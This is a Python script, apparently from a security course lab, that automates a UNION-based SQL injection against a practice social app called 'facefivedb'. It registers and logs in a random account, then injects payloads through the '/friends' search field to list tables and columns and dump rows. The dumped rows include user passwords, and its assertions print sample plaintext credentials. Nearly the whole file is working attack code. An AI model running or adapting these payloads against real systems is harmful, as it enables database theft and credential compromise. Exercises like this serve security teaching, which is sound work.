import requests, sys, os, random

if(len(sys.argv) < 3):
    print('Usage: python3 vuln2.py <link> <option> [table]')
    print('<option>:')
    print('--a       List all the tables of all databases')
    print('--t       List all the tables except from the information_schema database')
    print('--c       List all the columns of the [table] table')
    print('--r       List all the entries of the [table] table')
    quit()

if((sys.argv[2][-1] == 'c' or sys.argv[2][-1] == 'r') and len(sys.argv) != 4):
    print('Error: for this option you must introduce a table name')
    print('Usage: python3 vuln2.py <link> <option> [table]')
    quit()

SERVER = sys.argv[1]
OPTION = sys.argv[2]
if(len(sys.argv) == 4):
    TABLE = sys.argv[3]

session = requests.session()

user = str(random.randint(2**27, 2**28))
password = str(random.randint(2**27, 2**28))

params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/register', data=params)

params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

assert user in r.text

# Observation: only the 1st, 3rd and 4th parameters are displayed in each 'user profile' UI card.
# So, not all value's columns may be shown. However, it's as simple as changing the value.
# Example: in Users table, there are 5 columns (username, password, name, about, photo). In the query below, only the username, password and about
# are to be outputed. If any other information is needed (e.g.: the photo url), then just change 'username' to 'name'.
if (OPTION[-1] == 'a'):
    q = '\' and 1=0 UNION SELECT table_name,2,table_schema,table_rows,5 FROM information_schema.tables -- '
elif (OPTION[-1] == 't'):
    q = '\' and 1=0 UNION SELECT table_name,2,table_schema,table_rows,5 FROM information_schema.tables WHERE table_schema=\'facefivedb\' -- '
elif (OPTION[-1] == 'c'):
    q = '\' and 1=0 UNION SELECT column_name,2,data_type,column_key,5 FROM information_schema.columns WHERE table_name=\'%s\' -- ' % (TABLE)
elif (OPTION[-1] == 'r'):
    if (TABLE == 'Friends'):
        q = '\' and 1=0 UNION SELECT username1,2,username2,id,5 FROM Friends -- '
    elif (TABLE == 'FriendsRequests'):
        q = '\' and 1=0 UNION SELECT username1,2,username2,id,5 FROM FriendsRequests -- '
    elif (TABLE == 'Posts'):
        q = '\' and 1=0 UNION SELECT author,2,content,created_at,5 FROM Posts -- '
    elif (TABLE == 'Users'):
        q = '\' and 1=0 UNION SELECT username,2,password,about,5 FROM Users -- '
    else:
        print('Sorry, this website doesn\'t have that table.\nAvailable: Friends, FriendsRequests, Posts, Users')
        quit()

params = {'search' : q}
r = requests.get(SERVER + '/friends', params=params, cookies=session.cookies)

# Validation
if (OPTION[-1] == 'a'):
    # There are may tables in information_schema DB. For the sake of simplicity, only the used in the queries are asserted.
    assert 'TABLES : information_schema' in r.text
    assert 'COLUMNS : information_schema' in r.text
    assert 'Friends : facefivedb' in r.text
    assert 'FriendsRequests : facefivedb' in r.text
    assert 'Posts : facefivedb' in r.text
    assert 'Users : facefivedb' in r.text
elif (OPTION[-1] == 't'):
    assert 'Friends : facefivedb' in r.text
    assert 'FriendsRequests : facefivedb' in r.text
    assert 'Posts : facefivedb' in r.text
    assert 'Users : facefivedb' in r.text
elif (OPTION[-1] == 'c'):
    if (TABLE == 'Friends' or TABLE == 'FriendsRequests'):
        assert 'id : int' in r.text
        assert 'username1 : varchar' in r.text
        assert 'username2 : varchar' in r.text
    elif (TABLE == 'Posts'):
        assert 'id : int' in r.text
        assert 'author : varchar' in r.text
        assert 'content : text' in r.text
        assert 'type : enum' in r.text
        assert 'created_at : timestamp' in r.text
        assert 'updated_at : timestamp' in r.text
    elif (TABLE == 'Users'):
        assert 'username : varchar' in r.text
        assert 'password : varchar' in r.text
        assert 'name : text' in r.text
        assert 'about : text' in r.text
        assert 'photo : varchar' in r.text
    else:
        print('No assertion because that table isn\'t evaluated. Try one of the following: Friends, FriendsRequests, Posts, Users')
elif (OPTION[-1] == 'r'):
    # This fields vary. We tried to use the pre-existing data to assert, but we can't be sure if later it'll be deleted. 
    if (TABLE == 'Friends'):
        assert 'investor : SSofAdmin' in r.text
    elif (TABLE == 'FriendsRequests'):
        assert 'randomjoe1 : investor' in r.text
        assert 'randomjoe2 : investor' in r.text
        assert 'randomjoe3 : investor' in r.text
        assert 'randomjoe4 : investor' in r.text
    elif (TABLE == 'Posts'):
        assert 'administrator : No one will find that I have no secrets.' in r.text
        assert 'investor : This is a great platform' in r.text
        assert 'investor : Lets keep it for us but I believe that after this app Instagram is done' in r.text
        assert 'investor : TikTok might also be done but do not want ot make this bold claim in Public' in r.text
        assert 'SSofAdmin : There are no problems with this app. It works perfectly' in r.text
        assert 'SSofAdmin : Cannot put this app running. Can any of my friends help me' in r.text
        assert 'SSofAdmin : Just found a great new thing. Have a look at it. It might be of help. https://www.guru99.com/install-linux.html' in r.text
        assert 'SSofAdmin : This one is also great. https://www.youtube.com/watch?v=oHg5SJYRHA0&' in r.text
    elif (TABLE == 'Users'):
        assert 'ssofadmin : SCP' in r.text
        assert 'investor : benfica123' in r.text
        assert 'administrator : AVeryL33tPasswd' in r.text

